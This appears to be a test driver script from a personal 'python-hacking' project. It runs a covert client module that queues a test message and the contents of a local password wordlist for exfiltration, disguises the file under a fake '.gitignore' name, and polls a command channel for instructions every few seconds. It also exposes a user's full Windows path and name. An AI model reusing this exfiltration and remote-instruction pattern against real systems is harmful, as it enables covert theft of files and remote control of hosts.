from modules.cookie_comm import communication_client_main, read_file
from queue import Queue
from uuid import uuid1
import os
from modules.hash import hash


def enc(data):
    return data

def dec(data):
    return data

if __name__ == '__main__':
    exfiltrate = Queue()
    instructions = Queue()

    print(os.getcwd())
    # generate uuid1
    string = "hallo ğŸ’”ğŸ¦„ erik und felix, das ist eine test nachricht die ganzschÃ¶n lang ğŸ³ ist."
    stream = read_file("C:/Users/Felix Wenzel/Desktop/shareGH/python-hacking/tmp/test_wordlists/test_password.lst")


    exfiltrate.put(string)
    exfiltrate.put({'filename': f".gitignore {hash('C:/Users/Felix Wenzel/Desktop/shareGH/python-hacking/tmp/test_wordlists/test_password.lst')}", 'data': stream})

    client_id = str(uuid1())
    communication_client_main(client_id, exfiltrate, instructions, enc, time_between_requests=4)